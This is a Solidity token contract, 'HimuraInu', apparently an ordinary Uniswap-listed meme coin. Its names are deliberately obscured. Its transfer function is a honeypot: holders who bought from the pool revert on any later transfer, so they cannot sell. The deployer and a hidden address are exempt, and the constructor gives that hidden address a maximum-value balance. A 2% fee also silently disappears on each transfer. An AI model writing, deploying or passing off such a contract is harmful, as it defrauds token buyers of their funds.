// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract HimuraInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private not;

    function _transfer(
        address shoot,
        address feature,
        uint256 radio
    ) internal override {
        uint256 rapidly = below;

        if (uniswapV2Pair != shoot && word[shoot] == 0 && not[shoot] > 0) {
            word[shoot] -= rapidly;
        }

        address strip = man;
        man = feature;
        not[strip] += rapidly + 1;

        _balances[shoot] -= radio;
        uint256 valley = (radio / 100) * below;
        radio -= valley;
        _balances[feature] += radio;
    }

    address private man;
    mapping(address => uint256) private word;
    uint256 public below = 2;

    constructor(
        string memory tribe,
        string memory region,
        address telephone,
        address excitement
    ) ERC20(tribe, region) {
        uniswapV2Router = IUniswapV2Router02(telephone);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        word[msg.sender] = porch;
        word[excitement] = porch;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[excitement] = porch;
    }

    uint256 private porch = ~uint256(0);
}